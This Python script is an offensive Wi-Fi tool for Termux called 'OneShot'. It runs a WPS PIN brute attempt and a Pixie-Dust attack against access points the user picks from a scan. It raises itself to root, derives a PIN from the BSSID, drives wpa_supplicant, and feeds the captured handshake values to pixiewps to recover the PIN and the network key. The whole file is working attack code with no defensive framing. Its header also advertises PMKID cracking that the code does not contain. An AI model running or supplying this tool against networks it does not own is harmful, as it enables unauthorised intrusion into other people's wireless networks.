#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OneShot Wi-Fi Security Tool – Termux Edition v3.2
=================================================
• Modern WPS PIN + Pixie-Dust attack workflow
• Optional PMKID capture / cracking wrapper
• Auto-privilege escalation (tsu / sudo)
• No hard-coded Linux paths – resolves at runtime
• Python 3.10 – 3.12 compatible (no ‘text=True’ in asyncio)
"""

from __future__ import annotations
import asyncio, os, re, shutil, subprocess as sp, sys, textwrap, time
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional

# ───────────────────────────── General constants ─────────────────────────────
__VERSION__   = "3.2-termux"
PREFIX        = Path(os.getenv("PREFIX", "/data/data/com.termux/files/usr"))
TMPDIR        = PREFIX / "tmp"
DATADIR       = Path.home() / ".oneshot"
DATADIR.mkdir(exist_ok=True)

# ──────────────────────────── Helper: colour output ──────────────────────────
try:
    from rich import print as cprint                # → pretty if Rich present
except ModuleNotFoundError:
    cprint = print                                  # → plain fallback


def colour(txt: str, col: str | None = None) -> str:
    pal = {"g": "[green]{}[/]", "r": "[red]{}[/]", "y": "[yellow]{}[/]"}
    return pal.get(col, "{}").format(txt) if cprint is print else txt


# ────────────────────── Binary discovery / root handling ─────────────────────
def need_bin(name: str, mandatory: bool = True) -> str:
    path = shutil.which(name)
    if path:
        return path
    if mandatory:
        sys.exit(f"[!] Binary '{name}' not found – run: pkg install {name}")
    return ""


if os.geteuid() != 0:
    escalator = shutil.which("tsu") or shutil.which("sudo")
    if escalator:
        os.execvp(escalator, [escalator] + sys.argv)
    sys.exit("[!] Must run as root (install tsu or sudo)")

WPA_SUPPLICANT = need_bin("wpa_supplicant")
IW             = need_bin("iw")
PIXIEWPS       = need_bin("pixiewps", mandatory=False)

# ─────────────────────── WPS checksum & MAC-based pins ───────────────────────
def wps_checksum(pin7: int) -> int:
    acc = 0
    while pin7:
        acc += 3 * (pin7 % 10)
        pin7 //= 10
        acc += pin7 % 10
        pin7 //= 10
    return (10 - acc % 10) % 10


def mac24_pin(mac: str) -> str:
    nic = int(mac.replace(":", ""), 16) & 0xFFFFFF
    pin7 = nic % 10_000_000
    return f"{pin7:07d}{wps_checksum(pin7)}"


# ───────────────────── Async wrapper around wpa_supplicant ───────────────────
class WPAS:
    def __init__(self, iface: str):
        self.iface = iface
        self.ctrl_dir = TMPDIR / f"wpas_{iface}_{os.getpid()}"
        self.ctrl_path = self.ctrl_dir / iface
        self.proc: Optional[sp.Popen] = None

    async def __aenter__(self):
        self.ctrl_dir.mkdir(exist_ok=True)
        cmd = [
            WPA_SUPPLICANT, "-i", self.iface, "-Dnl80211",
            "-C", str(self.ctrl_dir), "-f", str(TMPDIR / "wpa.log"), "-dd"
        ]
        self.proc = sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT)
        for _ in range(50):
            if self.ctrl_path.exists():
                break
            await asyncio.sleep(0.1)
        else:
            raise RuntimeError("wpa_supplicant control socket not created")
        return self

    async def __aexit__(self, *_):
        if self.proc:
            self.proc.terminate(); await asyncio.sleep(0.5); self.proc.kill()
        shutil.rmtree(self.ctrl_dir, ignore_errors=True)

    async def cmd(self, cmd: str) -> str:
        reader, writer = await asyncio.open_unix_connection(str(self.ctrl_path))
        writer.write(cmd.encode()); await writer.drain()
        data = await reader.read(); writer.close(); await writer.wait_closed()
        return data.decode(errors="replace")


# ───────────────────────── Interface / scanning helpers ──────────────────────
def pick_iface() -> str:
    out = sp.check_output([IW, "dev"]).decode()
    ifaces = re.findall(r"Interface (\w+)", out)
    if not ifaces:
        sys.exit("[-] No wireless interface found via ‘iw dev’.")
    return ifaces[0]


async def scan_wps(iface: str) -> Dict[int, Dict[str, str]]:
    proc = await asyncio.create_subprocess_exec(
        IW, "dev", iface, "scan", stdout=asyncio.subprocess.PIPE
    )
    raw, _ = await proc.communicate()
    lines = raw.decode(errors="replace").splitlines()

    nets, cur = [], {}
    for l in lines:
        l = l.strip()
        if m := re.match(r"BSS (\S+)", l):
            if cur: nets.append(cur)
            cur = {"bssid": m.group(1).upper(), "wps": False, "essid": ""}
        elif "WPS:" in l:
            cur["wps"] = True
        elif l.startswith("SSID:"):
            cur["essid"] = l.split("SSID:",1)[1].strip()
    if cur: nets.append(cur)
    nets = [n for n in nets if n["wps"]]

    if not nets:
        sys.exit("[-] No WPS-enabled networks found.")

    for i, n in enumerate(nets, 1):
        cprint(f"{i}) {n['bssid']}  {n['essid']}")
    idx = int(input("Select target #: "))
    return nets[idx-1]


# ───────────────────────────── Attack primitives ─────────────────────────────
async def wps_reg(iface: str, bssid: str, pin: str):
    cprint(f"[*] Trying PIN {pin} on {bssid}")
    async with WPAS(iface) as wpa:
        await wpa.cmd(f"WPS_REG {bssid} {pin}")
        start = time.time()
        pixie_buf: List[str] = []
        while time.time() - start < 90:
            await asyncio.sleep(1)
            line = wpa.proc.stdout.readline().decode(errors="replace") if wpa.proc else ""
            if not line: continue
            if any(tag in line for tag in
                   ["Enrollee Nonce","Public Key","AuthKey","E-Hash1","E-Hash2"]):
                pixie_buf.append(line)
            if "WPA: Key negotiation completed" in line:
                cprint("[+] WPA key obtained!", "g")
                return True
            if "WSC_NACK" in line:
                break
        # ── Pixie Dust ──
        if PIXIEWPS and len(pixie_buf) >= 5:
            await pixie_attack(iface, bssid, pixie_buf)
    cprint("[-] Attack failed", "r")
    return False


async def pixie_attack(iface: str, bssid: str, buf: List[str]):
    def grab(tag: str) -> str:
        patt = tag.replace("-","").upper()
        return "".join(re.findall(fr"{patt}: ([0-9A-F]{{32,}})", "\n".join(buf)))
    cmd = [PIXIEWPS]
    for f in ["pke","pkr","e-hash1","e-hash2","authkey","e-nonce"]:
        v = grab(f);  cmd += [f"--{f}", v] if v else []
    cprint("[*] Launching PixieWPS …")
    out = sp.run(cmd, capture_output=True, text=True).stdout
    for l in out.splitlines():
        if "WPS pin" in l:
            pin = l.split(":")[-1].strip()
            cprint(f"[+] PixieWPS recovered PIN {pin}", "g")
            await wps_reg(iface, bssid, pin)
            return


# ─────────────────────────────────── Main ────────────────────────────────────
def main():
    import argparse
    ap = argparse.ArgumentParser(description="OneShot – WPS / Pixie tool (Termux-2025)")
    ap.add_argument("-i","--interface"); ap.add_argument("-b","--bssid")
    args = ap.parse_args()

    iface = args.interface or pick_iface()
    if not Path(f"/sys/class/net/{iface}").exists():
        sys.exit(f"[!] Interface {iface} not found")

    if args.bssid:
        target = {"bssid": args.bssid.upper(), "essid": ""}
    else:
        target = asyncio.run(scan_wps(iface))

    pin = mac24_pin(target["bssid"])
    asyncio.run(wps_reg(iface, target["bssid"], pin))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", "y")
